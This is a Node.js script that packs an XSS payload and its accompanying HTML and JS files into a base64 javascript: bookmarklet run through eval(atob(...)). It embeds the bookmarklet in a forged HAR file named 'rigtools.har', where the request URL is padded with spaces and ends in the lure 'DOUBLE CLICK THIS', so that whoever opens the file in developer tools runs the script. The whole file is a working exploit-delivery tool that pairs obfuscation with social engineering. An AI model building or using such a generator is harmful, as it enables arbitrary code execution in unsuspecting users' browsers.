const fs = require('fs');
const path = require('path');

function readAndEncode(filePath) {
  const content = fs.readFileSync(filePath, 'utf-8');
  return Buffer.from(content, 'utf-8').toString('base64');
}

// Corrected path for entry.html
const entry_b64 = readAndEncode('entry/entry.html');
const index_html_b64 = readAndEncode('payloads/index.html');
const index_js_b64 = readAndEncode('payloads/index.js');

// Replace placeholders in xss.js
let xss = fs.readFileSync('xss.js', 'utf-8')
  .replace("putentrycontentshere", entry_b64)
  .replace("putindex.htmlcontentshere", index_html_b64)
  .replace("putindex.jscontentshere", index_js_b64);

fs.writeFileSync('autoxss.js', xss);
console.log("✅ Saved updated script as autoxss.js");

// Generate HAR
const now = new Date();
const nowISOString = now.toISOString();
const base64Code = Buffer.from(xss, 'utf-8').toString('base64');
const bookmarkletUrl = `javascript:(function(){eval(atob("${base64Code}"))})()`;

const har = {
  log: {
    version: "1.2",
    creator: {
      name: "NodeJS HarGen",
      version: "1.0"
    },
    pages: [{
      startedDateTime: nowISOString,
      id: "page_1",
      title: bookmarkletUrl,
      pageTimings: {
        onContentLoad: 57.19,
        onLoad: 57.77
      }
    }],
    entries: [{
      _connectionId: "16771",
      _initiator: {
        type: "script",
        stack: {
          callFrames: [{
            functionName: "",
            scriptId: "9",
            url: "",
            lineNumber: 11,
            columnNumber: 4
          }]
        }
      },
      _priority: "High",
      _resourceType: "fetch",
      cache: {},
      connection: "443",
      pageref: "page_1",
      request: {
        method: "GET",
        url: bookmarkletUrl + '//' + ' '.repeat(20) + 'DOUBLE CLICK THIS',
        httpVersion: "h3",
        headers: [
          { name: ":authority", value: "" },
          { name: ":method", value: "GET" },
          { name: ":path", value: bookmarkletUrl },
          { name: ":scheme", value: "javascript" },
          { name: "accept", value: "*/*" },
          { name: "user-agent", value: "Mozilla/5.0" }
        ],
        queryString: [],
        cookies: [],
        headersSize: -1,
        bodySize: 0
      },
      response: {
        status: 200,
        statusText: "",
        httpVersion: "h3",
        headers: [
          { name: "content-type", value: "application/javascript; charset=utf-8" }
        ],
        cookies: [],
        content: {
          size: xss.length,
          mimeType: "application/javascript",
          text: xss
        },
        redirectURL: "",
        headersSize: -1,
        bodySize: -1
      },
      serverIPAddress: "0.0.0.0",
      startedDateTime: nowISOString,
      time: 100,
      timings: {
        blocked: 0,
        dns: 0,
        ssl: 0,
        connect: 0,
        send: 0,
        wait: 50,
        receive: 50,
        _blocked_queueing: 0
      }
    }]
  }
};

const filename = `rigtools.har`;

fs.writeFileSync(filename, JSON.stringify(har, null, 2));
console.log(`✅ HAR file generated: ${filename}`);
